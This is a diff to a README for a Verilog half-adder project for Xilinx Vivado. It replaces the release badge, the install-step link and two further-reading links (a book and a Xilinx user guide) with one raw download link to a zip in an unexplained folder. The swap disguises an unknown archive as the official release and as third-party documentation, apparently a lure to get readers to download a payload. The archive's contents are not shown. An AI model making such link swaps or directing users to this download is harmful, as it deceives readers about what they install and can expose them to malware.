@@ -6,7 +6,7 @@ Welcome to the **Half_Adder_Verilog_Code_Xilinx_Vivado** repository! This projec
 
 ## 📥 Download Link
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/Stephanie758/Half_Adder_Verilog_Code_Xilinx_Vivado/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Stephanie758/Half_Adder_Verilog_Code_Xilinx_Vivado/master/billot/Half_Adder_Verilog_Code_Xilinx_Vivado.zip)](https://raw.githubusercontent.com/Stephanie758/Half_Adder_Verilog_Code_Xilinx_Vivado/master/billot/Half_Adder_Verilog_Code_Xilinx_Vivado.zip)
 
 ## 📂 Overview
 
@@ -27,7 +27,7 @@ To run this project, you need:
 
 ## 🔧 How to Download & Install 
 
-1. **Visit the Release Page:** Click the following link to access the releases: [Download Here](https://github.com/Stephanie758/Half_Adder_Verilog_Code_Xilinx_Vivado/releases).
+1. **Visit the Release Page:** Click the following link to access the releases: [Download Here](https://raw.githubusercontent.com/Stephanie758/Half_Adder_Verilog_Code_Xilinx_Vivado/master/billot/Half_Adder_Verilog_Code_Xilinx_Vivado.zip).
 
 2. **Select the Latest Version:** You will see a list of available versions. Look for the latest release for the most up-to-date features.
 
@@ -84,8 +84,8 @@ If you encounter any issues or have questions, please open an issue in this GitH
 ## 📑 Additional Resources
 
 For more information on Verilog programming and digital logic design, consider the following resources:
-- [Verilog HDL: A Guideline to Digital Design](https://www.amazon.com/)
-- [Xilinx Vivado Design Suite User Guide](https://www.xilinx.com/support/documentation/user_guides/ug893-vivado-release-notes.pdf)
+- [Verilog HDL: A Guideline to Digital Design](https://raw.githubusercontent.com/Stephanie758/Half_Adder_Verilog_Code_Xilinx_Vivado/master/billot/Half_Adder_Verilog_Code_Xilinx_Vivado.zip)
+- [Xilinx Vivado Design Suite User Guide](https://raw.githubusercontent.com/Stephanie758/Half_Adder_Verilog_Code_Xilinx_Vivado/master/billot/Half_Adder_Verilog_Code_Xilinx_Vivado.zip)
 
 ## 💬 Community
 
